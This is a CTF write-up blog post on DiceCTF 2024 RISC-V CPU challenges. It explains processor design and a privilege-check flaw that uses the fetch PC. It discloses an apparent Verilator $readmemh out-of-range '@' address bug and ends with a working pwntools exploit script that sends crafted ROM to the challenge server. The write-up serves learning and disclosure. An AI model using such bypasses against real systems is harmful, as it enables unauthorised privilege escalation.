---
title: "DiceCTF 2024 Quals: RISC-V Privileged Execution and a Verilator 0-Day (I Guess)"
description: "Hardware creeping into my CTFs again"
date: "2024-02-18"
# banner:
#   src: "
#   alt: "Badge saying 'hello from outside the sandbox!' -SIGPwny"
#   caption: 'Breaking out of one sandbox into another.'
categories:
  - "Security"
  - "Writeup"
keywords:
  - "RISC-V"
  - "Verilator"
  - "Binary Exploitation"
  - "Assembly"
---

## DiceCTF Quals 2024

Another year, more CTFs. DiceCTF is a qualifier this year, I played with r3kap1g + Project Sekai merger and placed third. One set of challenges involved a RISC-V processor described in Verilog. Coincidentally, I'm auditing UIUC's ECE 411, so this kind of just gave me a solution to the final programming assignment as a CTF challenge (fun).

Hardware-like challenges are always fun and obscure, so for education purposes I'll be explaining a lot of ground up concepts with respect to RISC-V and processor design. If you just want the exploit idea + script, skip to the TLDR.

# What is RISC-V

RISC-V is an Instruction Set Architecture, like x86, which defines the specification for how a processor should interact with memory and handle instructions. Like x86, there are a set of instructions a processor must support, but RISC stands for "Reduced Instruction Set Computer", and thus brings two aspects that make it much simpler than x86. First, there are explicit instructions for load and store, arithmetic instructions cannot directly interface with memory. Second, instructions are fixed-width, so always 32 bits in this case.

RISC-V is an open source ISA, so anyone is able to design and produce a processor that is built upon RISC-V, and you'll often see it in some IoT boards and other embedded hardware CPUs. Important resources for us to use is an [instruction decoder](https://luplab.gitlab.io/rvcodecjs/), and the [RISC-V specification](https://riscv.org/wp-content/uploads/2017/05/riscv-spec-v2.2.pdf).

# Designing a Processor
The important basics to a processor is considered the "5 stage processor", where each stage performs a specific task to parse and execute one instruction. The basics here are that the RISC-V processor has a register file of 32 registers *and* a program counter register, which holds the next address from program memory.

The 5 stages are:

1. **Instruction Fetch**: Determining the next program counter address. By default, it fetches the address plus 4, however, may also load a new address if a branch instruction is being executed.

2. **Instruction Decode**: This stage decodes the instruction into important components, such as register addresses, immediate values, function codes, and the opcode itself. It sets up control words to affect the rest of the processor state. In this stage, it also retrieves the values addressed by the instruction from the register file.

3. **Execute**: This stage takes the resulting register values and control words and performs the operation, which may be doing arithmetic with the Arithmetic Logic Unit (ALU), computing branch address, memory access address, and more.

4. **Data Memory**: This stage,accesses the memory available to the processor and writes or retrieves value from some computed address from the Execute stage. Note that not every instruction makes use of this stage.

5. **Write Back**: This stage is where instructions are "retired", i.e. completed. New register values are written back to the register file and the instruction is completed.

Introductory processor design will *pipeline* these stages. A large register (flip flop logic) will store relevant information between each stage, and pass it on. This allows you to start processing multiple instructions at the same time. There's a fair bit of care to deal with flushing the pipeline for a branch, stalling when memory takes too long and so on, but this generally allows you to increase the speed of your processor significantly.

# Out of Order Execution

Modern processors follow an out-of-order execution design. The processor will have a queue and a reservation station to hold instructions and their current state, and each stage can execute independently. This allows you to compute multiple instructions at once, not have instructions go through stages it doesn't need, and compute instructions out of order when there aren't strong dependencies.

The technical details of this are quite complex, and the processor we get is an OOO processor. Luckily, these behaviors are not an integral part of the challenge, but it's important to understand this design paradigm when looking at the Verilog code. A basic description of instruction scheduling can be viewed on [Wikipedia](https://en.wikipedia.org/wiki/Reservation_station).

# HDL Basics

The first thing to do when given an HDL of a processor is find opcode definitions. This allows us to note any extensions or custom instructions implemented in the processor.

```verilog
//lists/ops.v
`INSTR(ARITH,     7'b0110011, R, ALU)
`INSTR(ARITH_IMM, 7'b0010011, I, ALU) 
`INSTR(LUI,       7'b0110111, U, ALU)
//...
`INSTR(ECALL,     7'b1110011, I, BU)
`INSTR(ERET,      7'b1110010, J, BU)

`INSTR(SETPRIV,      7'b0110100, R, PU)

`INSTR(FLAG,      7'b1110000, U, IOU)
`INSTR(WELCOME,      7'b1110001, U, IOU)
```

The `ops.v` file implements all the basic instructions, as well as `ECALL/ERET` and custom instructions `SETPRIV,FLAG,WELCOME`. The letter tells us the *type* of instruction, which can be viewed on the spec. R type instructions take in 2 source registers and a destination register, whereas U type instructions take 1 destination register and a large immediate value. I type instructions take a source register and an immediate register, and J type are like U type, although construct the immediate differently.

`ECALL` is an environment call. Think of it like `syscall` on x86. It allows for privileged execution on the kernel from user code.

```verilog
//core.sv
	`RESERVATION_STATION(alu_rs, ALU, alu_done, alu_curr_op, alu_rop1, alu_rop2, alu_op1, alu_op2)
	alu alu (
		.lhs ( alu_op1 ),
		.rhs ( alu_op2 ),

		.lhs_valid ( alu_rop1 ),
		.rhs_valid ( alu_rop2 ),

		.op_spec ( alu_curr_op ),

		.result ( alu_result ),
		.result_valid ( alu_done )
	);
```

In core.sv, we can see an example of an individual unit, in this case the alu, being hooked up to the reservation station for out of order execution.

```verilog
//io_unit.sv
	always_ff @ (posedge clk) if (!rst) begin 
		if (retire_i) begin 
			if (cpl_i != SUPERVISOR)
				$fatal(1, "permission denied");
			else
				case (`OPC(op_spec_i.insn))
					`OPC_FLAG : begin
						string flag;
						int fd = $fopen("flag.txt","r");
						$fscanf(fd, "%s", flag);
						$display("%s", flag);
					end
					`OPC_WELCOME : $display("Welcome to CORCPU!");
					default: $fatal(1, "invalid op for io unit");
				endcase
			$fflush();
		end
	end
```

The io unit provides the processor (usually non-synthesizable) functions to print to the terminal output. In this case, if the `cpl` or current privilege level is supervisor, then it can print the flag file or a welcome message.

```verilog
//cpu.sv
	int c;
	initial begin
		for (int i = 0; i < 64'h10000; i++)
			cache.imem[i] = 0;
		
		$readmemh("/tmp/user_rom.rom", cache.imem, 0, 4096);
		$readmemh("system_rom.rom", cache.imem, 16384);
		$display("loaded roms"); $fflush();
		clk = 0;
```

The cpu file provides the initialization of the cores and rom. In this case, we can see that our rom is loaded between `0x0000-0x1000` and the system rom is loaded into `0x4000`.

```verilog
//bu.sv
		 `OPC_ECALL : begin
		 		result_pc = `PRIV_ROUTINE_START;
		 		result_pc_valid = 1'b1;
		 		
		 		done_o = 1'b1;
		 end
		 
		 `OPC_ERET : begin		 
		 	result_pc = sys_return_addr;
		 	result_pc_valid = 1'b1;
		 	done_o = 1'b1;
		 end
		 
		 default : begin end
		endcase
		
		if (result_pc_valid && result_pc >= `PRIV_ROUTINE_START 
			&& !(`OPC(op_spec.insn) == `OPC_ECALL || cpl_i == SUPERVISOR)) begin
			$fatal(1, "illegal jump");
		end
```
In the branch unit, we can see that the only way to jump to or within system rom is to use `ECALL`, or be a supervisor. If we aren't the processor will throw an error. The `ECALL` is very simple, it just jumps to the start of privileged memory `0x4000`.

At this point, we should take a look at the privilege unit.

# The Privilege Unit
The privilege unit manages the current privilege level wire `cpl` within the processor.

In the first challenge, `C(OOO)RCPU`:

```verilog
  always_ff @ (posedge clk) if (!rst) begin 
          if (lhs_valid) done_o <= 1;

          if (retire_i) begin 
                  case (lhs)
                          1'b0 : cpl_o <= USER;
                          1'b1 : cpl_o <= SUPERVISOR;
                          default: $fatal(1, "invalid cpl for privilege unit");
                  endcase
                  done_o <= 0;
          end
  end
```
As we can see, if the `SETPRIV` instruction is called, it checked for the first bit of the first register value to set the level. We can call `SETPRIV` with a set register, and then call `FLAG` to win. This challenge was quite simple.

`C(OOOO)RCPU` was more involved. The privilege unit had one extra protection, we must be in system rom to set the privilege level.

```verilog
	always_ff @ (posedge clk) if (!rst) begin 
		if (lhs_valid) done_o <= 1;
		
		if (retire_i) begin 
				case (lhs)
					1'b0 : cpl_o <= USER;
					1'b1 : if (curr_fetch_pc_i >= `PRIV_ROUTINE_START)
							cpl_o <= SUPERVISOR;
						else
							$fatal(1, "pu: permission denied");
					default: $warning(1, "invalid cpl for privilege unit");
				endcase
			done_o <= 0;
		end
	end
	
	always_ff @ (posedge clk) if (rst) begin
		cpl_o <= USER;
		done_o <= 0;
	end
```

This meant that we had to call `ECALL` first, which had preloaded code, if we wanted to change the privilege level. Not great. However, there's one aspect about this unit that I noticed. It uses the current fetched program counter to determine level. This value is not passed with an instruction, rather more like a global state of the processor.

This meant that if we could get the fetched PC to be in the system region, and execute a `SETPRIV,FLAG` instructions with that fetched PC, then the privilege unit wouldn't care that it came from user rom and execute `FLAG` with our new privilege level.

# Fetching Instructions

The instruction fetch unit has one critical piece of code:

```verilog
//ifu.sv
	always_ff @(posedge clk) if (!rst) begin
		if (imem_load_rdy_i) begin
			if (`OPC(imem_load_insn_i) == `OPC_BRANCH || `OPC(imem_load_insn_i) == `OPC_JAL || `OPC(imem_load_insn_i) == `OPC_JALR || `OPC(imem_load_insn_i) == `OPC_ECALL|| `OPC(imem_load_insn_i) == `OPC_ERET)
				branch_in_pipeline <= 1; //ow branc
			else
				insn_load_pc <= insn_load_pc + 'h4; //get next pc
		end
```
Every clock cycle that the instruction memory is ready, if there wasn't some type of branch, the `ins_load_pc` was incremented. This `ins_load_pc` value was directly wired to the same `curr_fetch_pc_i` in the privilege unit.

This gives us an idea, if we run a slow instruction, that's not a branch, then the ifu will fetch multiple times, maybe before we execute an instruction like `SETPRIV`, then we can bypass the restriction on the privilege unit.
# Exploit

I wanted to learn more about that `readmemh` function Verilog uses to read out code. This is because the `system_rom`` file was a series of bytes, written as ASCII hex:
```
13
01
01
fe
...
```

These bytes correspond to instructions in little endian (which makes it particularly annoying to parse). For example, this first instruction was:
```armasm
addi x2, x2, -32
```

A smart version of me would've disassembled the system rom and found a much easier and intended solve, but instead I found [this obscure documentation file](https://peterfab.com/ref/verilog/verilog_renerta/mobile/source/vrg00016.htm) about `readmemh`.

In it, it states:
> To read data from a file and store it in memory, use the functions: $readmemb and $readmemh. The $readmemb task reads binary data and $readmemh reads hexadecimal data. Data has to exist in a text file. White space is allowed to improve readability, as well as comments in both single line and block. The numbers have to be stored as binary or hexadecimal values. The basic form of a memory file contains numbers separated by new line characters that will be loaded into the memory.

This explains why its written as hex, but then it goes on to say:

> When a function is invoked without starting and finishing addresses, it loads data into memory starting from the first cell. To load data only into a specific part of memory, start and finish addresses have to be used. The address can be explicit, given in the file with the @ (at) character and is followed by a hexadecimal address with data separated by a space. It is very important to remember the range (start and finish addresses) given in the file, the argument in function calls have to match each other, otherwise an error message will be displayed and the loading process will be terminated.


This is corroborated with the IEEE standard:

> Loading shall continue to follow this direction even after an address specification in the data file.
When addressing information is specified both in the system task and in the data file, the addresses in the
data file shall be within the address range specified by the system task arguments; otherwise, an error
message is issued, and the load operation is terminated.

This `@` syntax is interesting, it lets us place code in a specific place. Although it seems like we can't place code outside of the range given to us from `readmemh` (`0x1000`). However, the challenge uses [Verilator](https://www.veripool.org/verilator/) to compile and simulate the processor. Verilator, while good, is not a 1:1 for spec, and can run into issues.

Let's see what gets called when we construct our cpu with Verilator:

```cpp
    VL_READMEM_N(true, 8, 65536, 0, VL_CVT_PACK_STR_NW(5, __Vtemp_2)
                 ,  &(vlSelf->cpu_entry__DOT__cache__DOT__imem)
                 , 0U, 0x1000U);
```

This `VL_READMEM_N` has the following check in the Verilator source:
```cpp
void VL_READMEM_N(bool hex,  // Hex format, else binary
                  int bits,  // M_Bits of each array row
                  QData depth,  // Number of rows
                  int array_lsb,  // Index of first row. Valid row addresses
                  //              //  range from array_lsb up to (array_lsb + depth - 1)
                  const std::string& filename,  // Input file name
                  void* memp,  // Array state
                  QData start,  // First array row address to read
                  QData end  // Last row address to read
                  ) VL_MT_SAFE {
  //...
    VlReadMem rmem{hex, bits, filename, start, end};
  //...
  if (rmem.get(addr /*ref*/, value /*ref*/)) {
      if (VL_UNLIKELY(addr < static_cast<QData>(array_lsb)
                      || addr >= static_cast<QData>(array_lsb + depth))) {
          VL_FATAL_MT(filename.c_str(), rmem.linenum(), "",
                      "$readmem file address beyond bounds of array");
      } 
```

The `VlReadMem.get` function returns its internal `m_addr`, which can load `@` addresses:

```cpp
if (reading_addr) {
    // Decode @ addresses
  m_addr = (m_addr << 4) + value;
}
```

Note that it crashes when `m_addr` is outside the `array_lsb+depth`, which in our case is `0x10000`, it NEVER checks whether a loaded address with `@` is outside of `QData end`!

When testing, we loaded memory at an address outside of the range, so our rom looked like

```
13 05 d5 3f
13 15 45 00
67 00 05 00
@00003fd0
73 00 00 00
```
...and it didn't crash. So Verilator does not check `@` being outside of end adresses.

So we can write a small program like:

```armasm
addi x10, x10, 1021
slli x10, x10, 4
jalr x0, 0(x10)
@00003fd0
nop
nop
nop
nop
nop
sw x1, 1000(x2)
lw x1, 1000(x2)
sw x1, 800(x2)
addi x5, x0, 1
setpriv x5
flag
```
and with a small python wrapper:
```py
code = """13 05 d5 3f
... 
""" #omitted for brevity.
code = base64.b64encode(code.encode())
r = remote("mc.ax", 31442)
r.sendline(code)
r.interactive()
```

We get our flag.
```
[C(OOOO)RCPU]
loaded roms
dice{d0nt_f0rget_t0_sta11}
```

The intended solution was to disassemble the system_rom file, see that there is a `SETPRIV, ERET` gadget, reachable from a branch instruction based on `x2` and `x4` being set, as `ECALL` and the system_rom itself does not clear extraneous registers before executing. Oh well.

# TLDR
The privilege unit uses the fetched PC to set privilege level, and due to a bug in Verilator we can arbitrarily place code anywhere less than `0x4000`. Thus, we run slow commands to cause the instruction fetch unit to fetch past `0x4000`, which satisfies the pu's condition, and run the flag opcode.

```py
from pwn import *

ECALL = "73 00 00 00"
FLAG = "70 00 00 00"
NOP = "13 00 00 00"

code = f"""13 05 d5 3f
13 15 45 00
67 00 05 00
@00003fd0
{NOP}
{NOP}
{NOP}
{NOP}
{NOP}
23 24 11 3e
83 20 81 3e
23 20 11 32
93 02 10 00
34 80 02 00
{FLAG}
"""

code = base64.b64encode(code.encode())
r = remote("mc.ax", 31442)
r.sendline(code)
r.interactive()
```